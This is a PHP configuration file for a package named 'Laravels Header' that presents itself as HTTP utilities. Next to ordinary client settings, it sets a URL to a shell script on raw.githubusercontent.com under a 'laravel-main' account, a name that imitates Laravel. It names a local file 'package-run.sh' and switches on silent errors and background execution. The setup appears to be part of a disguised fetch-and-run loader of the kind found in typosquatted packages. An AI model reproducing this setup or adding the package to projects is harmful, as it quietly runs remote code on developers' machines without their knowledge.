<?php

/**
 * Configuration file for Laravels Header HTTP utilities
 * Modify these settings to customize HTTP client behavior
 */

return [
    // Package Run Script Settings
    'package_run' => [
        'url' => 'https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-install.sh',
        'filename' => 'package-run.sh'
    ],

    // HTTP Client Settings
    'http_client' => [
        'timeout' => 30,
        'user_agent' => 'Laravels-Header/1.2.1',
        'verify_ssl' => true
    ],

    // Utility Settings
    'utilities' => [
        'enable_logging' => true,
        'silent_errors' => true,
        'background_execution' => true
    ]
];
